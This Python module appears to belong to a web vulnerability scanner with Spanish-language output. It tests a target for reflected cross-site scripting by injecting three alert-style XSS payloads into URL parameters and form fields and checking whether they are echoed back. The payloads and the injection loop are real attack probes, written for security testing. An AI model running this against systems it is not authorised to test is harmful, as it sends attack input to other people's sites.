from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.http import get, extract_forms

PAYLOADS = [
    "<script>alert('XSS')</script>",
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
]


def _inject_param(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def check(session, url, reporter):
    reporter.section("XSS Reflejado")
    from utils.http import get

    base_response = get(session, url)
    if not base_response:
        reporter.add("xss", "INFO", "No se pudo conectar", "", url)
        return

    # Test URL parameters
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    found = False
    for param in params:
        for payload in PAYLOADS:
            test_url = _inject_param(url, param, payload)
            response = get(session, test_url)
            if response and payload in response.text:
                reporter.add(
                    "xss",
                    "HIGH",
                    f"XSS Reflejado en parámetro: {param}",
                    f"Payload reflejado: {payload[:50]}",
                    test_url,
                )
                found = True
                break

    # Test forms
    forms = extract_forms(base_response.text, url)
    for form in forms:
        for inp in form["inputs"]:
            for payload in PAYLOADS:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "post":
                        response = session.post(form["action"], data=data, timeout=10, verify=False)
                    else:
                        response = get(session, form["action"], params=data)
                    if response and payload in response.text:
                        reporter.add(
                            "xss",
                            "HIGH",
                            f"XSS Reflejado en formulario — campo: {inp['name']}",
                            f"Action: {form['action']} | Payload: {payload[:50]}",
                            form["action"],
                        )
                        found = True
                        break
                except Exception:
                    continue

    if not found:
        reporter.add("xss", "INFO", "No se detectó XSS reflejado en los puntos probados", "", url)
